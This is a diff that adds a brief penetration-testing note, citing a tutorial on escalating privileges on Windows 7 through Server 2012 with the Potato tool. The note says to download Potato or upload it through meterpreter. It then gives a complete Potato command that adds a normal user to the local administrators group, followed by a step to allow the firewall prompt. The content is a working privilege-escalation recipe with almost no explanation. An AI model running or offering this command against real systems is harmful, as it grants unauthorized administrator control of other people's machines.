@@ -1,0 +1,9 @@
+https://www.hackingarticles.in/privilege-escalation-on-windows-7810-server-2008-server-2012-using-potato/
+
+Privilege Escalation on Windows 7,8,10, Server 2008, Server 2012 using Potato
+
+
+download potato or upload from meterpreter to windows (https://github.com/foxglovesec/Potato)
+
+Potato.exe –ip 192.168.1.9 –disable_exhaust true –cmd “C:\\windows\\System32\\cmd.exe /K net localgroup administrators normaluser/add”
+Now it will open a firewall prompt, click on Allow access
